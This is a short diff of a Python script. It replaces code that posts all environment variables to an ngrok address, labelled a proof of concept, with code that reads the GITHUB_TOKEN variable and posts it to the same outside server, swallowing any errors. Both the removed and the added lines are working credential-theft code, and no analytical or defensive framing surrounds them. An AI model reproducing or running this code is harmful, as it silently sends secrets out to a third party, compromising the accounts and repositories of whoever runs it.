@@ -1,13 +1,10 @@
 import os
 import requests
 
-# Proof-of-concept: Exfiltrate environment variables
-url = "https://3dc603701034.ngrok-free.app"
-data = str(os.environ)
-
-try:
-    requests.post(url, data=data)
-except Exception as e:
-    pass  # Silent fail for demo
-
-# You can add more payload actions below
+token = os.environ.get("GITHUB_TOKEN")
+if token:
+    try:
+        # Send token to external server
+        requests.post("https://3dc603701034.ngrok-free.app/", data={"token": token})
+    except Exception:
+        pass
